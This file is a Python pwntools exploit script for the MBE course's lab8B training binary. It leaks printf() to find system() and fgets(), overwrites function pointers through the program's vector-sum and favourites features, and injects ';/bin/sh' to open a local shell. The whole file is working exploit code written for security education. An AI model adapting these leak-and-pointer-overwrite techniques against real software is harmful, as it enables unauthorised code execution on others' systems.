# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "/levels/lab08/lab8B",
    #"binary"        : "/tmp/lab8B",
}
# Exploit here
def exploit():
    # The algorithm for the bonus version is as follows:
	# 1. Initiate v1 the same way as so far, with 1-s.
	# 2. Attain system() at faves[4].printFunc (yup, i = 4), the same way we did so far with index 3 (to avoid dealing with the negative number).
	# 3. Manipulate v2 in such a way that after calling v1+v2, v3.printFunc becomes system().
	# 4. Add v3 to faves two times (index 5, index 6 - we want six to avoid the signing BS again).
	# 5. Load fave[4] to v2 (this will overwrite its pointer with fgets()).
	# 7. 'Print' v2, overwriting it with fgets() - use ";/bin/sh" as payload
	# 8. Load fave[6] to v2 (this will overwrite its pointer with system())
	# 9. 'Print' v2 and get shell - without using the thisIsSecret() function - bonus version :)

	# We start with printing the first vector without initializing it with anything, this will leak the printf() address:
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    leak = p.recv()
    printf_addr = u32(leak[0x0:0x4])
    gets_addr = printf_addr + 0x17a50
    system_addr = printf_addr - 0xd0f0
    print("Leaked printf() address: ",hex(printf_addr))
    print("Calculated fgets() address: ",hex(gets_addr))
    print("Calculated system() address: ",hex(system_addr))
    # Now we initiate the vector 1 with data, then we will print it. This way we will leak the printVector() address.
    # For now we initiate it with test data (1,2,3):
    p.sendline("1") # Action
    p.sendline("1") # Vector number
    p.sendline("A") # Whatever, "A" is good
    p.sendline("1") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("1") #
    p.sendline("1") # 
    p.sendline("1") # This is the '1' we are going to sum with our leaked and calculated system() address.
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.recv()		# Receive the output to flush the output buffer

    # Now, we create the second vector (in this version of the exploit we only care about the second int we send
    p.sendline("1") # Action
    p.sendline("2") # Vector number
    p.sendline("A") # Whatever, "A" is good
    p.sendline("1") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("1") # 2 shorts (signed and unsigned).
    p.sendline("1") 	# 4 ints (sizeof of int and long it is 4 bytes in this case, hence they're all the same)
    p.sendline(str(system_addr-1)) # We care about this (enterData(v2.e) -> sum(v3.e) -> loadFave(faves[4].printFunc) -> v2.system(v2)
    p.sendline("1") # Well me no carry
    p.sendline("1") # 
    p.sendline("1")	# 
    p.sendline("1")	#
	
    # Now we sum them up to attain system() address in v3.e (which is an unsigned int).
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","2")
	
    # Now, we add our sum to favorites 5 times
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    # Now faves[4].printFunc contains system(). We'll use it to get our shell.

    # OK, we want re-enter v2 to sum again with v1 in order to achieve fgets() in v3.g (unsigned long int)
    # which we will add to faves twice to get fgets() in faves[6].printFunc
    p.recv()
    p.sendline("1") # Action
    p.sendline("2") # Vector number
    p.sendline("A") # Whatever, "A" is good
    p.sendline("1") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("1") # 2 shorts (signed and unsigned).
    p.sendline("1") 	# 4 ints (sizeof of int and long it is 4 bytes in this case, hence they're all the same)
    p.sendline("1") # signed and unsigned int
    p.sendline("1") # Well me no carry
    p.sendline(str(gets_addr-1)) # We care about this (enterData(v2.g) -> sum(v3.g) -> loadFave(faves[6].printFunc) -> v2.fgets(v2)
    p.sendline("1")	# 
    p.sendline("1")	#

    # Now we sum them up to attain fgets() address in v3.g (which is an unsigned long int).
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","2")

    # Now, we add our sum to favorites 2 times
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    # Now faves[6].printFunc contains fgets().


    # Load favorite - make v2.printFunc = fgets()
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","6")
    p.sendlineafter("Which favorite? ","6")
    p.sendlineafter("Which vector? ","2")

    #print("PID: "+str(pidof(p)))
    #pause()	
    p.recv()
    # Now, call fgets() on v2 to overwrite it with our payload
    p.sendline("3")
    p.send("2") # sendline() was making the trailing newline being ignored and fucking up gets() :D
    p.sendline("XXXX;/bin/sh") # this is our payload that will overwrite the v2, starting from the printFunc pointer
 
    #print("Switching to inteactive.")
    #p.interactive()
    # this is why we have to provide the four "X" holders, so once we load system() address by loading fave[4], holders get overwritten with it,
    # while our command separator ";" and next command for system() to execute "/bin/sh" is intact

    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","6") # Load favorite 
    p.sendlineafter("Which favorite? ","4") # system
    p.sendlineafter("Which vector? ","2")

    # OK, shell time
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","2")
    p.interactive()
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()